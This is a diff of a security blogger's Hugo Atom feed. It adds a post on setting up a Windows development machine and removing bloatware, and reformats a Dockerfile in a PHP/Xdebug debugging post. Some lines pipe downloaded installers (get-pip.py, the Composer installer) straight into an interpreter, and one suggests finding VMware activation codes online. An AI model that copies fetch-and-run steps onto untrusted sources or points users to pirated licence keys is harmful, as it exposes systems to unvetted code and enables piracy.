@@ -4,7 +4,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
     <title type="text">wh1sper</title>
     <subtitle type="html">wh1sper的个人博客. web安全, 安全研究, CTF, writeup。</subtitle>
-    <updated>2023-01-30T20:24:37&#43;08:00</updated>
+    <updated>2023-02-08T17:44:32&#43;08:00</updated>
     <id>https://blog.wh1sper.com/</id>
     <link rel="alternate" type="text/html" href="https://blog.wh1sper.com/" />
     <link rel="self" type="application/atom&#43;xml" href="https://blog.wh1sper.com/atom.xml" />
@@ -15,12 +15,134 @@
                 <email>admin[at]wh1sper.com</email>
             </author>
     <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights>
-    <generator uri="https://gohugo.io/" version="0.90.1">Hugo</generator>
+    <generator uri="https://gohugo.io/" version="0.110.0">Hugo</generator>
+        <entry>
+            <title type="text">从0开始的Windows配环境之旅</title>
+            <link rel="alternate" type="text/html" href="https://blog.wh1sper.com/posts/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84windows%E9%85%8D%E7%8E%AF%E5%A2%83%E4%B9%8B%E6%97%85/" />
+            <id>https://blog.wh1sper.com/posts/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84windows%E9%85%8D%E7%8E%AF%E5%A2%83%E4%B9%8B%E6%97%85/</id>
+            <updated>2023-02-08T17:43:57&#43;08:00</updated>
+            <published>2023-02-08T16:06:36&#43;08:00</published>
+            <author>
+                    <name>wh1sper</name>
+                    <uri>https://blog.wh1sper.com/</uri>
+                    <email>admin[at]wh1sper.com</email>
+                    </author>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">用了2.5年的matebook实在是有点小卡，总共就512G的硬盘也爆炸了，瞧了瞧M2 pro的牙膏，心想还是再苟一苟，等等党永远不亏，所以就下狠心直接重装了Windows。 重装Windows 这没啥好说……</summary>
+            
+                <content type="html">&lt;p&gt;用了2.5年的matebook实在是有点小卡，总共就512G的硬盘也爆炸了，瞧了瞧M2 pro的牙膏，心想还是再苟一苟，等等党永远不亏，所以就下狠心直接重装了Windows。&lt;/p&gt;
+&lt;h2 id=&#34;重装windows&#34;&gt;重装Windows&lt;/h2&gt;
+&lt;p&gt;这没啥好说的，&lt;a href=&#34;https://www.wepe.com.cn/&#34;&gt;wepe&lt;/a&gt;，&lt;a href=&#34;https://next.itellyou.cn/&#34;&gt;NEXT, ITELLYOU&lt;/a&gt;，&lt;a href=&#34;https://www.disktool.cn/&#34;&gt;傲梅分区助手（wepe自带）&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;十多分钟搞定，主要是配环境和其他的问题。&lt;/p&gt;
+&lt;h2 id=&#34;配置各种环境&#34;&gt;配置各种环境&lt;/h2&gt;
+&lt;p&gt;语言倒不是很麻烦，各种语言能上多版本管理工具的都上了，版本之间环境隔离，用起来挺舒服&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;PHP&lt;/strong&gt;：&lt;a href=&#34;https://www.xp.cn/&#34;&gt;PHPstudy&lt;/a&gt;，打过CTF的都说好，还自带MySQL，nginx等多版本管理的功能，谁用谁知道。不过要注意低版本以前出过后门事件，使用的时候留意一下。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Node.js&lt;/strong&gt;：&lt;a href=&#34;https://github.com/coreybutler/nvm-windows&#34;&gt;nvm-windows&lt;/a&gt;，Go写的nodejs多版本管理工具，通过软链接和环境变量实现版本隔离，每个版本的npm也是隔离的，node默认安装在nvm同级目录，也不用担心占用C盘空间。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Golang&lt;/strong&gt;：&lt;a href=&#34;https://github.com/voidint/g&#34;&gt;g(gvm)&lt;/a&gt;，各平台通用的golang版本管理工具，也是通过软链接实现版本切换。默认会在用户目录下创建&lt;code&gt;.g&lt;/code&gt;目录，担心占用C盘的可以在cmd下用&lt;code&gt;mklink /J &lt;/code&gt;链接到其他地方去。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Java&lt;/strong&gt;：无工具，直接通过修改&lt;code&gt;JAVA_HOME&lt;/code&gt;环境变量实现版本切换，担心maven仓库占用C盘的用&lt;code&gt;mklink /J&lt;/code&gt;命令把&lt;code&gt;.m2&lt;/code&gt;目录链接到D盘去&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Python&lt;/strong&gt;：没多版本切换的需求，只有Python2，3并存的需求，直接去官网下载安装包分别装到两个目录就行了，然后把python2的&lt;code&gt;python.exe&lt;/code&gt;复制一份重命名为&lt;code&gt;python2.exe&lt;/code&gt;，原来的&lt;code&gt;python.exe&lt;/code&gt;别删，删了不好使。配环境变量的时候把python3目录放到python2目录之前，就可以保证使用命令&lt;code&gt;python&lt;/code&gt;的时候执行python3。对于pip，2.7版本可以直接在换源之后&lt;code&gt;curl https://bootstrap.pypa.io/pip/2.7/get-pip.py | python2&lt;/code&gt;来安装。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;IDE&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.jetbrains.com/zh-cn/idea/&#34;&gt;&lt;strong&gt;IntelliJ IDEA&lt;/strong&gt;&lt;/a&gt;，宇宙最强Java IDE，没啥好说的&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.jetbrains.com/phpstorm/&#34;&gt;&lt;strong&gt;PhpStorm&lt;/strong&gt;&lt;/a&gt;，调php代码用&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://code.visualstudio.com/&#34;&gt;&lt;strong&gt;Visual Studio Code&lt;/strong&gt;&lt;/a&gt;，除了Java和php其他都用这个，插件多，生态丰富&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Docker和wsl肯定不可或缺，装docker之前先装wsl2&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;WSL&lt;/strong&gt;：照着&lt;a href=&#34;https://zhuanlan.zhihu.com/p/386590591&#34;&gt;知乎&lt;/a&gt;的装，只不过我在store里面选择的Kali，这个Kali还可以装GUI，体验很不错。照着&lt;a href=&#34;https://learn.microsoft.com/zh-cn/windows/wsl/wsl-config&#34;&gt;ms的文档&lt;/a&gt;配置性能参数&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Docker&lt;/strong&gt;：&lt;a href=&#34;https://docs.docker.com/desktop/install/windows-install/&#34;&gt;Docker desktop for Windows&lt;/a&gt;，照着官网来，别忘了换源啥的。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;迁移wsl和docker的数据&lt;/strong&gt;：担心占C盘用WSL管理工具&lt;a href=&#34;https://github.com/DDoSolitary/LxRunOffline&#34;&gt;LxRunOffline&lt;/a&gt;，我用的mingw版本，可以把Docker和WSL的硬盘都迁移到D盘去&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Terminal、powershell7和美化&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Terminal&lt;/strong&gt;直接在store里面搜，powershell去&lt;a href=&#34;https://github.com/PowerShell/powershell/releases&#34;&gt;Github release&lt;/a&gt;下msi安装&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;美化&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;字体使用&lt;a href=&#34;https://www.nerdfonts.com/font-downloads&#34;&gt;Nerd Fonts&lt;/a&gt;，我用的Hack，看起来是&lt;a href=&#34;https://www.programmingfonts.org/#hack&#34;&gt;这样&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Oh-my-posh现在已经不支持powershell module了，按照&lt;a href=&#34;https://ohmyposh.dev/docs/installation/windows&#34;&gt;官方文档&lt;/a&gt;照着装&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;主题我用的stelbent，可以在powershell里输入&lt;code&gt;notepad $profile&lt;/code&gt;来设置，分享下我的：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;oh-my-posh init pwsh --config &amp;#34;$env:POSH_THEMES_PATH\stelbent.minimal.omp.json&amp;#34; | Invoke-Expression
+Import-Module posh-git
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;其他&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Git、&lt;a href=&#34;https://desktop.github.com/&#34;&gt;GitHub Desktop&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.u.tools/&#34;&gt;utools&lt;/a&gt;，这个强烈推荐，里面的ctool超级好用，一般人我不告诉他。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/Fndroid/clash_for_windows_pkg/releases&#34;&gt;Clash For Windows&lt;/a&gt;，懂得都懂&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/2dust/v2rayN/releases&#34;&gt;V2rayN&lt;/a&gt;，也很棒，多一个代理防止打内网的时候不能访问Google&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://geekuninstaller.com/&#34;&gt;geek uninstaller&lt;/a&gt;，卸载软件用&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://picgo.github.io/PicGo-Doc/zh/guide/&#34;&gt;PicGo&lt;/a&gt;，配合GitHub图床，写博客用&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;VMware Workstation Pro，网上直接找激活码&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;对抗国产流氓软件&#34;&gt;对抗国产流氓软件&lt;/h2&gt;
+&lt;h3 id=&#34;火绒高级防护&#34;&gt;火绒高级防护&lt;/h3&gt;
+&lt;p&gt;Windows Defender作为杀软确实不错，我的那些工具一下就给我吞了，但是在整治国产流氓软件这方面还得看火绒，推荐火绒的&amp;quot;高级防护&amp;quot;功能，可以自定义防护规则，防止创建目录和读取浏览器历史之类的。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/main/img/202302081710228.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;规则可以在&lt;a href=&#34;https://bbs.huorong.cn/forum-45-1.html&#34;&gt;火绒论坛&lt;/a&gt;里找到，我用的是&lt;a href=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/main/img/202302081713589.zip&#34;&gt;火绒安全自定义规则 v29.0.zip&lt;/a&gt;，导入的时候需要同时导入规则和自动处理。&lt;/p&gt;
+&lt;h3 id=&#34;根治流氓软件&#34;&gt;根治流氓软件&lt;/h3&gt;
+&lt;p&gt;因为我习惯了tim和360压缩，导入规则之后，火绒就疯狂给我告警。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/main/img/202302081716497.png&#34; alt=&#34;&#34;&gt;]&lt;/p&gt;
+&lt;p&gt;但是由于一些原因，我有时候需要关闭火绒，这就给了这些软件可乘之机。&lt;/p&gt;
+&lt;p&gt;之前打awd的时候杀不死马可以创建同名目录来防止文件再生，这里我迁移一下，创建一个同名文件来防止目录创建&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/main/img/202302081718691.png&#34; style=&#34;zoom: 50%;&#34; /&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/main/img/202302081719560.png&#34; style=&#34;zoom: 50%;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/main/img/202302081720198.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;根据火绒安全日志里面的目录，一个个创建，注册表同理，创建一个键然后权限全部关掉。&lt;/p&gt;
+&lt;p&gt;然后世界就清净了。&lt;/p&gt;
+&lt;h2 id=&#34;小结&#34;&gt;小结&lt;/h2&gt;
+&lt;p&gt;一套下来，C盘占用不到50G，D盘占不到100个G，四舍五入又拥有了一台新电脑。&lt;/p&gt;
+</content>
+            
+            
+            
+            
+            
+                
+                    
+                        
+                            
+                            
+                            
+                                <category scheme="https://blog.wh1sper.com/categories/misc/" term="Misc" label="Misc" />
+                            
+                        
+                    
+                
+                    
+                
+            
+        </entry>
+    
         <entry>
             <title type="text">Docker下PHP调试环境搭建</title>
             <link rel="alternate" type="text/html" href="https://blog.wh1sper.com/posts/docker%E4%B8%8Bphp%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" />
             <id>https://blog.wh1sper.com/posts/docker%E4%B8%8Bphp%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
-            <updated>2023-01-30T20:24:30&#43;08:00</updated>
+            <updated>2023-01-30T20:24:32&#43;08:00</updated>
             <published>2023-01-29T15:52:26&#43;08:00</published>
             <author>
                     <name>wh1sper</name>
@@ -71,8 +193,8 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;./dbgpProxy -s 127.0.0.1:9003 -i 0.0.0.0:9001
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./dbgpProxy -s 127.0.0.1:9003 -i 0.0.0.0:9001
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;用于监听客户端连接的地址最好填 &lt;code&gt;0.0.0.0&lt;/code&gt; ，避免网卡选错的麻烦。&lt;/p&gt;
 &lt;h2 id=&#34;宿主机无法收到xdebug请求&#34;&gt;宿主机无法收到Xdebug请求&lt;/h2&gt;
@@ -106,29 +228,27 @@
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-dockerfile&#34; data-lang=&#34;dockerfile&#34;&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;s&#34;&gt; php:8.2-apache&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# COPY --from=composer /usr/bin/composer /usr/bin/composer&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;RUN&lt;/span&gt;    php -r &lt;span class=&#34;s2&#34;&gt;&amp;#34;readfile(&amp;#39;https://getcomposer.org/installer&amp;#39;);&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php &lt;span class=&#34;se&#34;&gt;\
-&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; mv /var/www/html/composer.phar /usr/bin/composer&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;RUN&lt;/span&gt;    sed -i &lt;span class=&#34;s2&#34;&gt;&amp;#34;s@http://deb.debian.org@http://mirrors.aliyun.com@g&amp;#34;&lt;/span&gt; /etc/apt/sources.list &lt;span class=&#34;se&#34;&gt;\
-&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt clean &lt;span class=&#34;se&#34;&gt;\
-&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get update &lt;span class=&#34;se&#34;&gt;\
-&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get -y install libzip-dev libicu-dev &lt;span class=&#34;se&#34;&gt;\
-&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; docker-php-ext-install mysqli zip intl &lt;span class=&#34;se&#34;&gt;\
-&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; pecl install xdebug-3.2.0 &lt;span class=&#34;se&#34;&gt;\
-&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; docker-php-ext-enable xdebug &lt;span class=&#34;se&#34;&gt;\
-&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;xdebug.mode=debug&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /usr/local/etc/php/php.ini&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# dbgpProxy, for multiuser debugging&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# ssh, for tunnel&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# RUN   curl https://xdebug.org/files/binaries/dbgpProxy -o /usr/bin/dbgpProxy \&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#     &amp;amp;&amp;amp; chmod +x /usr/bin/dbgpProxy \&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#     &amp;amp;&amp;amp; apt-get install ssh&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-dockerfile&#34; data-lang=&#34;dockerfile&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;s&#34;&gt; php:8.2-apache&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# COPY --from=composer /usr/bin/composer /usr/bin/composer&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;RUN&lt;/span&gt;    php -r &lt;span class=&#34;s2&#34;&gt;&amp;#34;readfile(&amp;#39;https://getcomposer.org/installer&amp;#39;);&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; mv /var/www/html/composer.phar /usr/bin/composer&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;RUN&lt;/span&gt;    sed -i &lt;span class=&#34;s2&#34;&gt;&amp;#34;s@http://deb.debian.org@http://mirrors.aliyun.com@g&amp;#34;&lt;/span&gt; /etc/apt/sources.list &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt clean &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get update &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get -y install libzip-dev libicu-dev &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; docker-php-ext-install mysqli zip intl &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; pecl install xdebug-3.2.0 &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; docker-php-ext-enable xdebug &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;xdebug.mode=debug&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /usr/local/etc/php/php.ini&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# dbgpProxy, for multiuser debugging&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# ssh, for tunnel&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# RUN   curl https://xdebug.org/files/binaries/dbgpProxy -o /usr/bin/dbgpProxy \&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#     &amp;amp;&amp;amp; chmod +x /usr/bin/dbgpProxy \&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#     &amp;amp;&amp;amp; apt-get install ssh&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;docker-compose.yml:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -152,24 +272,24 @@
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;nt&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;3.2&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;services&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;webserver&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;php-82-apache-xdebug-32&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
